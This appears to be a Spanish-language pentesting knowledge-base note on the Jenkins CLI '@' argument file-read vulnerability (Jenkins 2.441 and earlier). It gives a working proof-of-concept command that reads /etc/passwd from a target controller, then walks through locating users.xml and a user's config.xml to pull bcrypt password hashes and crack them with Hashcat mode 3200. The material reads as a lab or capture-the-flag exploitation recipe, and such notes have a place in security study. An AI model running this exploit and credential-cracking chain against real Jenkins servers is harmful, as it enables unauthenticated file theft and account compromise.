Jenkins 2.441 y anteriores, LTS 2.426.2 y anteriores no desactivan una función de su analizador de comandos CLI que reemplaza un carácter '@' seguido de una ruta de archivo en un argumento con el contenido del archivo, lo que permite a atacantes no autenticados leer archivos arbitrarios en el sistema de archivos del controlador Jenkins.

PoC:

`java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/etc/passwd 2>&1 | grep -oP "'.*?'"`

![image](https://github.com/SrMeirins/KnowledgeVault/assets/95763783/099ecadf-8826-42bf-89fa-ad037b08657f)

Como aprovecharnos de esto? --> Podemos ir a la ruta donde por defecto están las contraseñas encriptadas de los usuarios y si podemos intentar crackearlas.
La ruta va a ser dinámica ya que tenemos un archivo común llamado `users.xml` donde va a indicarse cuales son las rutas de los usuarios (nombre + cadena numerica). La ruta completa es: `/var/jenkins_home/users/users.xml`.

Una vez tengamos el nombre completo de la ruta del usuario, vamos a centrarnos en este archivo: `/var/jenkins_home/users/userrandom_12108429903186576833/config.xml`. Si filtramos por _password_, vamos a ver una contraseña cifrada:

![image](https://github.com/SrMeirins/KnowledgeVault/assets/95763783/191c119b-7b59-4abe-a21f-3bfef6f2649b)

Para crackearlo con HashCat, el identificador es 3200 (bcrypt).
